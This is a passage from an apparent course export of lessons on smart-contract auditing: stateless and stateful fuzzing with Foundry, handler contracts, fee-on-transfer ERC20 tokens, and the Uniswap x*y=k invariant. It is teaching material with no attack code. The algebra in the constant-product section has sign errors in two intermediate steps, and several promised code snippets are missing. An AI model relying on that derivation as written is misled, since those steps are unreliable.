          Good question! We‚Äôll get there, but remember, we are just humans, and the chance for errors and omissions is high. We might fail to spot certain defects during the manual review of the security test. This is precisely why leveraging automated tools as much as possible for these reviews is essential. Trust me, the experiences we collect from the practice of working with these tools are going to be invaluable.

          ## Plunge into Fuzzing: Stateless and Stateful

          In this chapter, we will focus on working with **stateless** and **stateful** fuzzing along with some advanced strategies. These techniques have personally worked wonders for me in competitive audits. My method has been to comprehend a protocol's invariant without really examining the code base, write an invariant test suite, and voila ‚Äì bugs are unveiled effortlessly.

          There are also other fuzzers to explore. Take the [Echidna Fuzzer](https://github.com/crytic/echidna) by the Trail of Bits team, for instance. Famed for being a smart fuzzer and powered by 'Slither', it is a fantastic tool indeed. Another outstanding option is the [Consensys Fuzzer](https://github.com/Consensys/diligence-fuzzing). This is a paid corporate cloud fuzzer and hence we won't be able to provide a walkthrough for it. [Foundry](https://github.com/foundry-rs/foundry) is yet another promising candidate with built-in fuzzing.

          Here is the content that these READMEs possess:

          - An understanding of what invariants are
          - A better insight into the different strategies we plan to employ to break invariants and discover vulnerabilities.

          I strongly recommend that you go ahead, pause this session, and thoroughly read through this. Trust me, understanding it now will make it easier when we get into the hands-on segment.

          ## Breaking Invariants: The Game Begins

          Let's now move forward to the fun segment ‚Äì you will write code along with me and understand every snippet. I assure you that by the end of this, you will have become an invariant testing pro. This mastery over the subject will help you discover vulnerabilities quicker and more effectively.

          First, in your code base, find the Invariant Break folder and remove it. Yes, you heard it right ‚Äì remove it! Doing so is a sure-shot way to ensure you are not merely copy-pasting but genuinely understanding every piece of code. Let's start with stateless fuzzing.

          Once we are through with learning these strategies for fuzzing, we'll return to our Uniswap code base and familiarize ourselves with its 'x times y equals k' core invariant. We'll then try to break it and uncover bugs without examining the code base and solely understand the invariants.

          So let's gear up and set out on this exciting and insightful journey of breaking invariants and fuzzing, navigating through this incredible world of coding and contracts. Let's learn, practice, improve, and ultimately ‚Äì strive towards becoming super badasses in smart contract testing and auditing.

          > "The only way to learn a new programming concept is by writing programs." - Dennis Ritchie
        description: 'Patrick emphasizes the importance of practice to master stateful and stateless fuzz testing.'
      -
        id: de00c65e-7aa4-4e9c-bafb-c8df31aff63a
        type: new_lesson
        enabled: true
        title: 'Stateless Fuzzing'
        slug: stateless-fuzzing
        duration: 9
        video_url: 00TNZxT2re4tNO88zGwdb12ssA9fUDxByOGgZvEN2H00M
        raw_markdown_url: /routes/security/5-tswap/12-stateless-fuzzing/+page.md
        markdown_content: |-
          ---
          title: Stateless Fuzzing
          ---

          _Follow along with the video:_



          ---

          Today, we'll be navigating through the SC exploits minimize codebase, focussing specifically on the `Invariant Break`. We aim to understand, practice, and discuss the power of stateless fuzzing, an essential tool in the world of software testing. Rest assured, we will also provide a minimized example to clarify how it works.

          ## What is Stateless Fuzzing?

          Stateless fuzzing, often referred to simply as fuzzing, is a technique where random data is supplied to a function to break some invariant or property. Remembering our discussion from the video of continuously attempting to pop a balloon serves as an apt analogy. It's all about continuously providing different inputs to a function until it breaks. If you have a function with an invariant that it should never return zero, then fuzz testing might just be the answer.

          ## Breaking the Invariant: Writing the Test Case

          With our codebase ready, and ourselves aware of the functionality we are testing. We need to write the test case to break it. Let's create a new folder named `Invariant Break` to prepare for our first stateless fuzz test. Naming the test `statelessfuzzcatchestest.sol`, we focus on catching the bug automatically using fuzz testing.

          This test is more than just a unit test which checks the invariant once. With fuzzing, we apply various random numbers to the function and see if it breaks the invariant or not. The beauty of this strategy is that we can detect issues that can be missed out on during manual checks or basic unit tests.

          ![](https://cdn.videotap.com/3SkpmLCCBFnsZH2yqkEW-412.31.png)

          ## Setting the Fuzz Options

          Let's take a moment to understand the fuzz options. The number of runs determines the number of different balloons (inputs) we use in a stateless fuzz option. So we need to carefully adjust this value to ensure we're checking for as many edge cases as possible. Another crucial property is the seed, which, when kept the same, will offer the same inputs instead of random ones. This can be extremely helpful in debugging.

          ![](https://cdn.videotap.com/BjOp2RCvRkPDt2VcD5fL-453.54.png)

          With the fuzz options set, our test is ready to run. After a few runs, the test should fail, meaning our fuzz test has successfully caught the bug‚Äîgreat job on creating your first fuzz test. But what if it doesn't fail? Well, you may need to increase the number of runs or change the seed. With randomness at play, there's never a 100% guarantee that you'll catch the bug in a particular run. This makes the fuzzing process a bit of hit or miss, but the advantages outweigh this con, as it helps to ensure the robustness of your functions.

          Seeding different values and number of fuzzing runs directly impact how thoroughly the test cases are checked. Adjust these values according to your specific needs, cover as many alleyways as possible - fuzz it till you dust it off! But remember, it's crucial to analyze the balance between the number of runs, seed selection and performance of your testing.

          ## Wrapping Up Stateless Fuzzing

          In conclusion, stateless fuzzing is a powerful tool for catching bugs where you expect a specific invariant. However, it's important to remember its limitations, such as being stateless and so not being able to pick up on issues caused by interactions between different functions. It's also a tool reliant on randomness, which means you can never be sure you've explored every possible scenario. Yet it remains a swift and highly efficient method for bug hunting.

          In the upcoming sections, we'll move forward from stateless fuzzing to touch upon more complex and exciting testing methodologies. Until next time, happy fuzzing!

          > ‚ÄúIt‚Äôs not at all important to get it right the first time. It‚Äôs vitally important to get it right the last time.‚Äù - Andrew Hunt and David Thomas
        description: 'Patrick walks through stateless fuzzing to catch an invariant break in TSwap!'
      -
        id: 34e42011-1e07-4f7a-ba66-cffd239fa490
        type: new_lesson
        enabled: true
        title: 'Where Stateless Fuzzing Fails'
        slug: where-stateless-fuzzing-fails
        duration: 11
        video_url: 02AK19ljI63pu4cbDsKkJCgrjnBW101zIUKUzBt00Eum00w
        raw_markdown_url: /routes/security/5-tswap/13-where-stateless-fuzzing-fails/+page.md
        markdown_content: |-
          ---
          title: Where Stateless Fuzzing Fails
          ---



          ---

          Hello readers, today, we're diving into the realm of stateful fuzzing. If you've been following our development journeys on smart contracts, you already know about stateless fuzzing. Stateless fuzzing, as we've discussed before, starts every fuzz run from scratch.

          But with stateful fuzzing, things get a bit more exhilarating! Upon each pass of stateful fuzzing, the outcomes from the previous run become inputs to the next run.

          ### Defining Stateful Fuzzing

          Sounds interesting? Let's illustrate using a simple example.

          Imagine you have a balloon. You do one thing to try to pop it, say, drop it. If it doesn't pop, instead of grabbing a new balloon, you apply another action on the same balloon, like kicking or squeezing it.

          The same theory applies to our smart contracts. We call a function on our contract, change its state, and then repeat the process on the **same** contract. Quite unlike stateless fuzzing, where you start with a fresh state at every run!

          #### Running the Fuzz Test

          After ensuring everything is set, we‚Äôre now ready to run our fuzz test on this. Perhaps by making 1000 runs initially.

          Did it find a bug? No. You may be tempted to increase iterations to say, 10,000, then 100,000 or maybe even to a million runs! But listen, no matter how long you wait for the fuzzer to finish running, it will **never find the bug**

          This is because the initial value was mounted at one and the balloon (contract state) you created is still at one, having slipped back to its initial state with each run. The only time it could return zero, breaking our invariant, is when the value changes to zero. Therefore, the contract's state must change.

          This is precisely what a stateful fuzz test can find for us!

          > _‚ÄúTalk is cheap. Show me the code.‚Äù_  
          > _- Linus Torvalds_
        description: 'Patrick walks through some testing failures and how Foundry can be configured to achieve better results.'
      -
        id: c8b0a51e-b8f1-410b-9d57-1c56ccb99a22
        type: new_lesson
        enabled: true
        title: 'Fuzzing Where Method 1 Fails'
        slug: fuzzing-where-method-1-fails
        duration: 18
        video_url: iZX9yLjkpgEbXjjuBnUcETEtjs4UUyvUHIn1OXYWIxc
        raw_markdown_url: /routes/security/5-tswap/14-fuzzing-where-method-1-fails/+page.md
        markdown_content: |-
          ---
          title: Stateful Fuzzing Where Method 1 (open) Fails
          ---



          ---

          Welcome back fellow learners! We are on this exciting journey together to lay the foundation of Smart Contract Security Testing. What have we learned thus far?

          ## Stateless Fuzzing vs Stateful Fuzzing

          We discovered that stateless fuzzing was not effective in detecting bugs in functions which require more complexity, such as `changeValue` - a function which updates a contract's state.

          ```js
          function changeValue(uint256 _value, uint256 _multiplier) public {
              value = _value * _multiplier;
          }
          ```

          In this case, we employed a mechanism known as stateful fuzzing. With this method, we can catch much more subtle and nuanced bugs by accounting for contract state changes during fuzzing.

          However, we encountered a hiccup when we were dealing with an integer overflow issue. We had to set the `failOnRevert` to `false` for our fuzzing test to work! That's because `myValue` could be a huge number, larger than a `uint256` can hold, causing an overflow.

          Despite these hurdles, we soldiered on and made it this far. Now, it's time to graduate to an even more complex scenario - fuzzing a vault contract!

          ## Breaking The Invariant With Stateful Fuzzing

          So, let's start by attempting to break this invariant using stateful fuzzing.

          Firstly, we'll set up the test contract and import our dependencies, including the token mocks that will be used.

          Next, we'll create a token array and launch the tokens to be supported by our token vault. We will then set up the user who'll be interacting with the vault and provide them with a starting amount of tokens.

          Finally, we compose the fuzzing test itself. We begin by pranking the user, effectively manipulating their available tokens. We then perform the withdrawal operation of both types of tokens from the vault. Eventually, we assert that the user's token balance has not changed after the deposit and withdrawal operations.

          The critical learning here is that we should always be able to withdraw the same amount we've deposited - this assertion must not fail!

          ## All That Glitters Is Not Gold

          Alas, it appears that we celebrate too soon. On running this test, it's clear that we've run into an issue - our deposit function fails!

          When this happens, a good practice is to turn on the verbose logs ( -vvv flag) to see what's happening beneath the hood. We quickly detect the root cause - our fuzzer was making deposit attempts with unsupported tokens.

          Too much randomness in fuzzing can be just as detrimental as not enough randomness. We also notice that we never made the approve call for the ERC20 tokens, which was necessary for a deposit operation. Our fuzz test was essentially doomed from the start!

          ## TL;DR

          In this blog post, we discussed the progression from stateless to stateful fuzzing for smart contract testing. While stateless fuzzing is fantastic for catching some easy bugs, it falls short in detecting bugs in the case of more complex functions.

          Stateful fuzzing overcomes these limitations, but it comes with its own set of challenges, like dealing with integer overflows. The takeaway here is the importance of finding the goldilocks zone of randomness while fuzzing - too little or too much can skew our test results!
        description: 'Introduction to different methods of fuzzing when we have no luck with Method 1.'
      -
        id: 4a94be28-9b2e-49ca-a666-7eac99cf2d6d
        type: new_lesson
        enabled: true
        title: 'Stateful Fuzzing Method 2'
        slug: stateful-fuzzing-method-2
        duration: 14
        video_url: a01yHqmMWhOEY79XH1gkkBboGZ01nJGkzudX5VnjBXQaY
        raw_markdown_url: /routes/security/5-tswap/15-stateful-fuzzing-method-2/+page.md
        markdown_content: |-
          ---
          title: Stateful Fuzzing Method 2
          ---

          _Follow along with the video:_



          ---

          # Working with Smart Contracts Using Foundry: Setting up Handlers and Invariant

          In this digital world where cryptocurrencies like Bitcoin, Ethereum, and others are trending, it's essential to understand how to use and create smart contracts. This article will guide you on how to create two new contracts utilizing Foundry; a known blockchain testing framework. The contracts to be created are `handler.t.sol` and `Invariant.t.sol`.

          Coming along, we will also explore how to work with the `fail on revert` function.

          ## Setting up the Handler Contract: `handler.t.sol`

          Handling smart contracts could be complex, especially if you're a beginner. However, with Foundry, we can manage our function calls to focus on vital operations for our code base, resulting in a less error-prone contract.

          Consider the idea that we have two types of users in our system; one who can deposit and another, withdraw. This simplification gives us a better sense of controlling bugs by ensuring an easier flow of interactions. Consequently, the `fail on revert` option should ideally be set to true. This validation will allow us to confirm the validity of our tests.

          When set to false, if our fail on revert test passes, it presents no valuable insight because there are too many pathways for the fuzzer to follow, potentially calling irrelevant functions. Although starting with the fail on revert set to false can be a suitable starting point, the intention should always be to work towards getting it set to true.

          Now, to the creation of our `handler.t.sol`. This particular contract will be set up as the intermediary for restricting the `handler stateful Fuz catches` contract.

          Through the handler, we will instruct our Foundry and `Stateful Fuzzing Test Suite` to correlate with the `handler stateful Fuz catches` contract appropriately. We are essentially telling the Foundry when to call deposit, to approve, mint, and have the tokens. Likewise, when to call withdraw; all these with precise guidelines on avoiding explosive function calls.

          In the handler contract, specific lines are written for the 'ERC20 token' and the 'USDC token'. Here's what the snippet looks like:

          This handling setup focuses on 'deposit' and 'withdraw' functions thus curbs randomness and gives our fuzzer more accurate paths to follow, thereby giving correct and more reliable test results.

          ## Setting up the Invariant Contract: `Invariant.t.sol`

          The `Invariant.t.sol` involves creating the invariant test. Here, unlike in the handler contract `handlerT.sol`, we are particularly interested in an invariant that interacts with the handler contract and not the actual contract.

          To begin setting up `Invariant.t.sol`, start by importing the handler with a line of code that looks like this:

          Consequently, instead of fuzzing the actual contract, we are going to fuzz the handler in a process that is easier and more sensible. The logic is that we want our transactions handled in a way that makes sense and thus the adoption of the `fuzz selector` as seen in the code below:

          This instructs the contract that the selectors and the target address to be used are those outlined in the handler.

          ## In Conclusion

          Setting up the `handlerT.sol` and `Invariant.t.sol` contracts helps break down the complexity of dealing with smart contracts. By implementing these contracts, we have given Foundry a framework to follow that makes its function calls more logical and less random. Therefore, we no longer have to deal with reverts, and we can focus better on our tests, making our iterations more meaningful and insightful.

          Remember, the best way to become proficient at handling smart contracts is repetition. Practice by trying these methods out on your old code bases, which should help you improve your coding skills and understanding of stateful fuzzing. You don't have to become an expert all at once; take small steps and ask questions when you face roadblocks.

          All being said, smart contracts could save significant time, reduce the risk of manual errors, and thus revolutionize the way we perform secure transactions. Learning how to work with them will not only keep you relevant but also give your work an edge.

          > Note: This article assumes that you have a basic knowledge of smart contracts Foundry and programming. It might be helpful to do a bit of reading if you're not familiar with these topics.

          Happy coding!
        description: 'A second approach to stateful fuzzing by Patrick.'
      -
        id: 2b9d46bd-50a3-4def-8595-618c46346854
        type: new_lesson
        enabled: true
        title: 'Debugging Fuzz Sequences'
        slug: Debugging-Fuzz-Sequences
        duration: 7
        video_url: RnyCSAFxT00kVdWQ1DCFWsz94SFQiBZFScRyrlh02JCw8
        raw_markdown_url: /routes/security/5-tswap/16-Debugging-Fuzz-Sequences/+page.md
        markdown_content: |-
          ---
          title: Debugging Fuzz Sequences
          ---



          ---

          # Invariant Testing, Fuzzing, and a Weird ERC-20 Exploit

          ## Introduction

          Hello, folks! In this blog post we'll embark on an exciting journey of executing invariant testing using a fuzzer. We will encounter misconfigurations, understand the output generated, identify the source of confused states (yes, we're going to meet a weird ERC20 token variant!), and unveil the importance of writing good tests, especially when dealing with external contracts.

          Ready? Let's get started!

          ## The Initial Fuzzing Scenario

          The first thing we need to do is run our fuzzer, which is already configured to a contract, in our case, the "Mock USDC." We have coded a fuzzer test, `forge test --mt`, that we'll apply here.

          **_Code to be inserted:_**

          ```shell
          forge test --mt name-of-test
          ```

          As we eagerly anticipate a successful test run...

          ### Problem Identification: The Fuzzer‚Äôs Anarchy

          ![](https://cdn.videotap.com/dJ9d44aCK4jLbP02SRGT-77.81.png)

          Unfortunately, things don't turn out as planned. The fuzzer is attempting to interact with every possible edge, not just the "handler" contract we intended to speculate. To tether its leash back, we explicitly identify the target contract.

          After the amendment, another run of the test is conducted.

          ### Signalling Errors: The Test Output

          Run again, we are greeted with an error message from a call to `withdrawYield` (ERC20).

          The output isn't clear, but running the command `-VVV` (very, very verbose) may shed light on the error. The detailed output points fingers at an "insufficient balance," raising questions why our fuzzer-guided users are struggling to withdraw tokens they own.

          Attempting to better understand this scenario, we consciously decide to ignore the revert conditions. However, the issue persists, generating a mountain of output data.

          A new strategy is formulated to drop ‚Äòthe seed‚Äô controlling the fuzz, re-running the test in search of more comprehensible output.

          ## Deep Dive: The Problematic ERC20 Token

          Analysis of new output traces reveal that the `depositYield` function is also encountering a revert condition. A comparison of the pre and post-amendment data validates the improvement acquired through the fuzz restriction.

          The error persists through multiple test runs, so we opt to investigate the contract code, revealing nothing out of the ordinary in the `withdrawToken` function, a likely suspect. Maybe the issue lies within the token itself?

          A scrutiny of `yieldYear20` also reveals nothing amiss, except one: a custom error message.

          The error signals a lack of balance, an oddity since the user‚Äôs balance should align with the deposit amount. But it's the fine print that throws a spanner in the works.

          ## Unraveling the Truth: A Sinister Token

          Looking further into the `yieldYear20` token, we notice an eccentric mechanism: for every 10 transactions, a 10% fee is deducted and transferred to the owner. Smelling a rat, this erratic behavior is the root of the violation of our invariant.

          ### An Unexpected Result: Violation of the Invariant

          Here‚Äôs what unfolds: after back-to-back deposit and withdrawal transactions of the `yieldYear20` tokens, the 10th transaction deducts this 'fee,' dispatching 10% of tokens to the owner's contract. This act violates our invariant, which demands that users can always withdraw the exact balance fraction amount.

          ## Importance of a Well-Written Test Suite

          Luckily, our top-notch stateful fuzzing test suite spotted the anomaly. It showcased the significance of having well-detailed tests, especially when external contracts, such as tokens, are involved. This informal audit brought attention to a significant pitfall potential, ‚ÄúWeird ERC-20 tokens.‚Äù

          ### Wrap Up: Invitations, Exploitations, and Auditations

          ‚ÄúCongratulations for digesting this massive chunk of knowledge! Don't fret if you're perplexed; it's a lot to take in, especially without hands-on practice. But remember, Rome wasn't built in a day!

          The key takeaway here is the importance of writing detailed test suites, accurately capturing potential anomalies that could break our system. As for our journey, you've just witnessed the first exploit of this session, the "Weird ERC-20 Tokens," a concept we will explore in-depth in coming sessions.

          > ‚ÄúTo iterate is human, to recurse, divine.‚Äù ‚Äì L. Peter Deutsch

          Having unraveled the problem, we're now geared up for the final leg of our expedition, auditing the ‚ÄòT-Swap protocol.' Stay tuned, as exciting discoveries await!"
        description: 'Uncover a broken invariant and debug the output sequence of our fuzz testing in this TSwap lesson.'
      -
        id: f69e22bd-9912-4545-812b-1a44744e6120
        type: new_lesson
        enabled: true
        title: 'Fuzzing Recap'
        slug: fuzzing-recap
        duration: 2
        video_url: ZIreQHFgdWlZ5jhfq51kxYNglTrhnlQ9LNkW5kybSCM
        raw_markdown_url: /routes/security/5-tswap/17-fuzzing-recap/+page.md
        markdown_content: |-
          ---
          title: Fuzzing Recap
          ---



          ---

          # Mastering the Art of Fuzzing: Stateless, Stateful, and Weird ERC 20 Exploits

          In this blog post, we're going to dive into the exciting world of `fuzzing`. Hang in there and get ready to uncover the intricacies of stateless fuzzing, explore the intriguing concept of stateful fuzzing, programmatically exploit the Weird ERC 20, and navigate the maze of manual bug finding in your codebase.

          ## A Quick Recap: All About Stateless Fuzzing

          So, what did we just uncover? We got to grips with the powerful tool called `stateless fuzzing`. Stateless fuzzing offers invaluable aid to developers as it tests a system with a series of random inputs, shreds through layers of errors, helps to uncover bugs in a codebase, and optimizes system performance.

          However, stateless fuzzing does have a downside. Its efficiency falls abruptly when it comes to `stateful fuzzing`. Why? Because stateful fuzzing isn't just about pounding a codebase with random inputs. It's more like a well-choreographed dance sequence, requiring precise steps and accurate timing.

          _"Stateless and stateful fuzzing holds the same end goal: to identify and fix bugs and vulnerabilities in a codebase. However, they approach this goal from different perspectives."_

          ## The Handler Method: Bridging the Gap between Stateless and Stateful Fuzzing

          But here's the shimmering light at the end of the tunnel: the handler method. This handy little method functions as a proxy that enables us to call our contract and achieve a more nuanced stateful fuzzing strategy, especially when dealing with complex contracts.

          In simple terms, the handler method allows us to make our randomness `less random`. This directed randomness enables stateful fuzzing to probe more effectively into a codebase's vulnerabilities.

          It helps the fuzzer go down paths that make sense, ensuring a more efficient and targeted fuzzer run.

          ![](https://cdn.videotap.com/imecUt1GioVaw6WCZCUs-33.1.png)

          ## Teasing the Weird ERC 20 Exploits

          Next, we dipped our toes into the Weird ERC 20 exploit. While we didn‚Äôt dive deep into this topic, consider it your cliffhanger, your incentive to keep learning! We‚Äôll be exploring the Weird ERC 20 in detail soon enough. It's an exploit you definitely don‚Äôt want to miss because it is a crucial tool to test more advanced code contracts.

          _"In the world of coding and security breaches, the 'weird ERC 20' presents itself as a fascinating challenge and a riveting exploit that aids in uncovering deeper vulnerabilities within the code."_

          ## Looking Forward: The Road Ahead with TSWAP and Manual Review

          With this newly acquired knowledge, next on our agenda is to apply these techniques to `TSWAP` and run stateful fuzzing tests. After we've done that, we'll dive headlong into the fascinating world of manual reviews.

          The manual review process can seem tedious, especially since it involves hunting down bugs without any automation. But rest assured, it‚Äôs an amazing learning journey that adds tremendous value to your skillset as a developer.

          ## Take-A-Break Strategy

          After this whirlwind tour of fuzzing, exploit, and reviews, you‚Äôve made it so far and gained quite a bit of expertise! Peeling back layers of codes, vulnerabilities, and in-depth testing strategies can be mentally taxing, which is why it's important to give your brain some downtime.

          _"Learning is a marathon, not a sprint; don't forget to hydrate, take breaks, and recharge yourself."_

          Feel free to take a short break, stretch a bit, go for a walk or do anything you find relaxing. When you‚Äôre ready, we'll reconvene and continue our descent into the rabbit hole of coding exploits and vulnerabilities, enriched, refreshed, and ready for more.

          Until then, congratulations once again and see you after your well-deserved break!

          Stay tuned for more fuzzing and coding action in the next blog entry!
        description: 'Stateful/Stateless Fuzzing, Handler Method Importance, ERC20 Exploit, TSWAP Testing & Bugs.'
      -
        id: 193a4e62-8f2e-41e3-bfaa-9d9006564d17
        type: new_lesson
        enabled: true
        title: 'Weird Erc20s'
        slug: weird-erc20
        duration: 4
        video_url: m1vcLcx9Hm2EscLBPq2jk93Gj4xFU8LW65qqwPQ02tLM
        raw_markdown_url: /routes/security/5-tswap/18-weird-erc20/+page.md
        markdown_content: |-
          ---
          title: Exploit - Weird ERC20s (These are a menace to Web3)
          ---



          ---

          # Exploring the Weird World of ERC-20 Smart Contracts: Security, Oddities and Auditing

          In this blog post we'll delve into one of the most interesting parts of the decentralized area - ERC-20 Smart Contracts and their intricate aspects. We‚Äôre going to go back to the `cipher` security and auditing full course on GitHub and explore more about a special section named **TSWAP**, specifically _section five_.

          ## Tackling the ERC-20 Quirks

          > _Remember, it's the stuff we don't know that keeps us up at night._

          One weird instance that we are going to discuss today is about `ERC-20 fee on transfer token`, which was part of the `SC_exploits`. When testing this token, it was found that for every ten transactions, a fee was being charged. This might seem innocuous, but this little oddity has the potential to destabilize numerous protocols.

          ![](https://cdn.videotap.com/AepJ0CJaMiwbHLC1x4GC-49.5.png)

          ## The Anomalies of ERC-20 Tokens

          ERC-20 Tokens come in all shapes and sizes. Here's a glimpse into some of the variants and potential problems that lurk in the shadows:

          1. **Reentrant tokens**: These ERC-777s seem harmless, but even a simple transfer of these tokens can lure you into a pit of reentrancy attacks.
          2. **Missing return values**: Some tokens don‚Äôt return a boolean on ERC-20 methods. For transactions requiring a status check, this can be a potent problem.
          3. **Fee on transfer**: Some tokens sneak in a fee on every transfer while others can start doing so in the future.
          4. **Upgradable tokens**: These tokens, like USDC, could morph into anything over time.
          5. **Rebasing tokens**: These tokens magic away your balance by meddling with different contracts.
          6. **Tokens with blocklists**: Some tokens put restrictions on certain transacting parties.
          7. **Low/high decimals**: Token numbers can go from unusually low to abnormally high, causing calculation mishaps.
          8. **Multiple token addresses**: These tokens exist in more than one places at once.

          ## Dealing with ERC-20 Tokens Anomalies

          ![](https://cdn.videotap.com/4oHWptmu7liSgxFnB37w-170.5.png)

          ERC-20 Tokens are an external smart contract that one must treat with a level of wariness. While integrating with them, you must be fully aware of the token‚Äôs characteristics.

          Blockquote:

          > _Playing in the world of ERC-20s without complete information is like dancing on a live minefield._

          A cagey approach to interacting with ERC-20s can be the difference between a successful dApp and a failed project.

          ![](https://cdn.videotap.com/fnsDlRcZfomWTHFt6MFT-214.5.png)

          In conclusion, if you are aspiring to be a top-flight builder of powerful smart contracts. This website is an excellent guide to understanding and gaining expertise in the world of smart contracts. It serves as both a practical tool and an in-depth manual to secure smart contracts.

          And remember, "The first step to great security is being aware about all the unknowns!".
        description: "Patrick discusses various ERC20 quirks that can affect a protocol's security including missing return values and fee-on-transfer tokens."
      -
        id: 6a0f18c4-814b-4633-b5b4-003b101496a7
        type: new_lesson
        enabled: true
        title: 'Writing Stateful Fuzz Test Suite'
        slug: writing-stateful-fuzz-test-suite
        duration: 1
        video_url: T01QiR8liaNn83eu02na8c5eRUv2YNPN1lrReX022P13WM
        raw_markdown_url: /routes/security/5-tswap/19-writing-stateful-fuzz-test-suite/+page.md
        markdown_content: |-
          ---
          title: Writing Stateful Fuzz Test Suite
          ---



          ---

          # Unearthing Invariant Bugs in T Swap: An In-Depth Look at Stateful Fuzzing

          In the world of code development, testing isn't just a good practice ‚Äì it's essential. This article provides a holistic perspective on a recent exploration into T Swap's codebase, observed practices, and the application of stateful fuzzing test suites.

          ## Understanding T Swap: The Prelude

          Before we delve into our primary focus, let's backtrack and recap.

          While sifting the codebase, it was evident that T Swap is well-grounded in underlying unit tests. However, the presence of specific entity, a certain critical invariant, led to a realization about the absence of something integral.

          > "If the codebase has unit tests but no stateful fuzzing test, should we be concerned?"

          Our answer to this turned out to be a resounding yes. It was a hint pointing towards the potential issues nestled within the T Swap system. Identifying these areas for improvement was not held within the realms of SRC ‚Äì it was staring right at us.

          ## The Task at Hand: Writing an Invariant Test Suite

          Stepping back to our main branch, we essentially locked eyes with an important discrepancy. Our codebase recognized its unit tests yet failed to host stateful fuzzing tests. And thus, the mission was clear. We were mandated to write the stateful fuzzing test suite and slightly so, expected to discover bugs in the process.

          The task involved working directly with the T Swap's codebase, devising an automated stateful fuzzing invariant test suite. We believed that by accomplishing this, we would be able to unmask potential bugs within the system.

          ## The Rollout: A Zero Manual Review Approach

          In a paradigm shift from conventional methods, we decided to go zero manual review - a method entirely run by an automated test suite. While this may seem daunting, the focus was to write an automated test suite that will identify the bugs without human interference.

          However, to validate our automated test suite's competence, we decided to undertake a modest amount of manual review. This was a complimentary step to ensure the robustness of our newly coded test suite.

          After exacting the plan, we were ready to run our test suite and examine the results.

          ## In Summary

          Using hints from the T Swap's system peculiarities and their own testing protocols, we realized that there was an absence of an integral part of test coverage ‚Äì stateful fuzzing tests. A thorough exploration of this deficiency led us to write an automated invariant test suite, supplemented by a hint of manual review.

          The goal was to find bugs with minimum manual intervention, and guess what? We did find some. So, stay tuned for the next part of this journey as we dissect the bugs and understand how to rectify them!

          Remember at all times, coding might be art, but testing is a science!
        description: 'Stateful Fuzzing & Manual Review for TSWAP Bugs'
      -
        id: 661fbd6d-5f1e-4b21-9330-9836857077d7
        type: new_lesson
        enabled: true
        title: 'Constant Product Formula Explained'
        slug: constant-product-formula-explained
        duration: 9
        video_url: QZsbxhV2ceWGdd2qwwAJzdHWTOLXaMovBmvAEq5eDJY
        raw_markdown_url: /routes/security/5-tswap/20-constant-product-formula-explained/+page.md
        markdown_content: |-
          ---
          title: Constant Product Formula Explained
          ---



          ---

          # Unraveling the Math in Uniswap's X \* Y = K Invariant

          > **"The main thing we want to keep in mind is the ratio of tokens should always stay the same."**

          Uniswap, a popular decentralized exchange protocol, leverages a relatively simple mathematical principle to ensure that the balance within the pool maintains a certain ratio. At the core of its mechanism is the invariant formula: X \* Y = K, which is held constant throughout all trading activities. However, when fees are factored in, the invariant technically increases, leading to a somewhat complex equation which we'll dissect further in this blog post.

          Seeing all the math involved, you might feel a bit overwhelmed, but hang tight, as we take a deep dive into the intricacies of the math and algebra involved. If you are someone with a keen interest in mathematics and decentralized finance, strap yourself in as we journey down this Uniswap mathematical express.

          ## X \* Y = K, The Magic Invariant Equation

          Our first step is to grasp the magic invariant equation, X \* Y = K. Our code base operates on an invariant principle where the token balance of X times the token balance of Y should always equal the same constant, K.

          Here is the equation:

          ```ruby
          X * Y = K
          ```

          The token balance of X times the token balance of Y after a swap operation should still equal the same constant K, regardless of the asset swapped. Let's illustrate the idea using an example:

          Given we have a Uniswap pool of Ethereum (WETH) and USD Coin (USDC), and a trader makes a swap operation ‚Äî removing some WETH to add some USDC ‚Äî the balance ratio should remain constant to prevent the trader from manipulating the price to their advantage.

          ![](https://cdn.videotap.com/7AR7AuVGUkohvd6xDQ8G-119.24.png)## Simplifying The Equation

          The X \* Y = K equation might seem a straightforward invariant, but implementing it as an assertion in the codebase can be challenging. But don't worry ‚Äî to ease the process, we need to simplify this equation to a form where we can explicitly say the change in token balance must always follow a certain formula.

          We'll simplify the equation using algebra to a format suitable for ‚Äústateful fuzz testing‚Äù. Don't feel pressured if you don't follow every step; you can still hold on to the principle that checks out.

          Here‚Äôs the process of simplifying the equation using algebra:

          1. Starting with the core equation and its variant:

          ```ruby
          X * Y = K (core equation)X * Y = (X + ‚àÜX) * (Y - ‚àÜY) (With changes ‚àÜX and ‚àÜY in X and Y)
          ```

          ![](https://cdn.videotap.com/QHzVQA2HNb4hbKJl7pYc-220.14.png)2. Using the FOIL (First Outer Inner Last) algebraic method to simplify the equation:

          ```ruby
          X*Y - X*‚àÜY  = X*Y + ‚àÜX*Y - ‚àÜX*‚àÜY
          ```

          3. X\*Y appearing on both sides of the equation:

          ```ruby
          -X*‚àÜY  = ‚àÜX*Y - ‚àÜX*‚àÜY
          ```

          4. Isolate the change in X (denoted as ‚àÜX):

          ```ruby
          ‚àÜX * Y - ‚àÜX * ‚àÜY = X * ‚àÜY
          ```

          5. Factor out ‚àÜX:

          ```ruby
          ‚àÜX * (Y - ‚àÜY) = X * ‚àÜY
          ```

          6. Solve for ‚àÜX:

          ```ruby
          ‚àÜX = (X * ‚àÜY) / (Y - ‚àÜY)
          ```

          And there you have it! We've simplified the equation from X \* Y = K, down to ‚àÜX = (X \* ‚àÜY) / (Y - ‚àÜY) ‚Äî an equation we can use in our fuzz test!

          ![](https://cdn.videotap.com/q4fjlDbGWHwTtzGV6qC4-467.79.png)## Wrapping Up and Next Steps

          We did some crafty algebra to break down X \* Y = K to a simplified equation. Remember, the formulas we were dissecting are vital for the Uniswap protocol to maintain a balanced token ratio, hence they are also vital for us when creating our stateful invariant testing suite.

          Don't despair if the blocks of algebra seems difficult to understand because all the math we've covered will be included in the associated Github repo. If you're more comfortable with visual diagrams or need a deeper explanation of mathematical techniques, [Chat GPT](https://chat.openai.com/) can be very helpful.

          For those who wish to take an even deeper dive into the formal verification of the X\*Y=K market maker model, the respected paper on [Runtime Verification](https://runtimeverification.com/) goes into detail about how the formula works from a formal perspective.

          Thanks for reaching this part, keep up the good work, and see you in the next blog post!
        description: "Explore the constant product formula and test it's implementation in TSwap through Fuzz and Unit testing."
      -
        id: d8649b57-9977-4a49-9b40-fd74a03c43b1
        type: new_lesson
        enabled: true
        title: Invariant.t.sol
        slug: invariant-t-sol
        duration: 17
        video_url: ocof300Xrlq02CyqKvJe5Ddr6GISNFBl02K2gH2pr00oes00
        raw_markdown_url: /routes/security/5-tswap/21-invariant-t-sol/+page.md
        markdown_content: |-
          ---
